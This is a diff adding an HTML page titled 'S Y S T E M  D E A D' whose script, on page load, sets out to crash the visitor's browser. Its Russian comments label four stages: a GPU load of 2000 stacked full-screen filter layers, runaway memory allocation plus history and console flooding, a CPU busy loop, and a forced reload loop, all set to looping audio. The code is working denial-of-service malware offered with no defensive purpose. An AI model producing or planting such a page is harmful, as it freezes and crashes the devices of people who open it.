@@ -1,0 +1,82 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>S Y S T E M  D E A D</title>
+    <style>
+        body { background: #000; margin: 0; overflow: hidden; }
+        #log { color: #f00; font: 10px monospace; white-space: pre; position: absolute; }
+    </style>
+</head>
+<body onload="init()">
+    <div id="log">SYSTEM_FAILURE_DETECTION...</div>
+
+    <svg style="display:none">
+        <filter id="nuke">
+            <feTurbulence type="fractalNoise" baseFrequency="0.99" numOctaves="100" />
+            <feColorMatrix values="0 0 0 9 0 0 0 0 9 0 0 0 0 9 0 0 0 0 9 0"/>
+        </filter>
+    </svg>
+
+    <script>
+        function init() {
+            // Задержка 1 секунда перед концом
+            setTimeout(() => {
+                const audio = new Audio('sound.mp3');
+                audio.loop = true;
+                audio.play().catch(() => {});
+                
+                startAnnihilation();
+            }, 1000);
+        }
+
+        function startAnnihilation() {
+            // 1. Смертельная петля графики (GPU)
+            for(let i = 0; i < 2000; i++) {
+                let d = document.createElement('div');
+                d.style.cssText = `
+                    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+                    filter: url(#nuke); backdrop-filter: blur(100px) invert(1);
+                    z-index: ${i};
+                `;
+                document.body.appendChild(d);
+            }
+
+            // 2. Memory Nuclear Bomb (RAM)
+            const memory = [];
+            const leak = () => {
+                while(true) {
+                    // Выделение огромных массивов BigInt
+                    memory.push(new BigInt64Array(1024 * 1024 * 10)); 
+                    // Забивание истории браузера до отказа
+                    history.pushState(null, "", "#" + Math.random().toString(36));
+                    
+                    // Вывод в консоль для торможения отладчика системы
+                    console.log("%c TERMINATING", "font-size:100px;");
+                    
+                    // Принудительный рекурсивный вызов
+                    if (memory.length % 100 === 0) break;
+                }
+                setTimeout(leak, 1);
+            };
+            leak();
+
+            // 3. CPU Deadlock (Заморозка планировщика)
+            function freeze() {
+                let end = performance.now() + 500;
+                while(performance.now() < end) {
+                    // Математический шторм
+                    Math.exp(Math.random()) * Math.tan(Math.random());
+                }
+                requestAnimationFrame(freeze);
+            }
+            freeze();
+
+            // 4. Force Reload Loop (Финальный удар)
+            setInterval(() => {
+                location.replace(location.href + "#" + Date.now());
+            }, 500);
+        }
+    </script>
+</body>
+</html>
